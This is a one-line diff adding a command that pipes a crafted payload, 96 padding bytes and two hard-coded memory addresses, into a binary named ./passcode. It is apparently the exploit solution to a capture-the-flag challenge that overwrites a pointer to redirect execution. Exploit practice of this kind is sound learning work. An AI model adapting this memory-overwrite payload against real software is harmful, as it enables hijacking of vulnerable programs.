@@ -1,0 +1,1 @@
+python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '\xea\x85\x04\x08'" | ./passcode
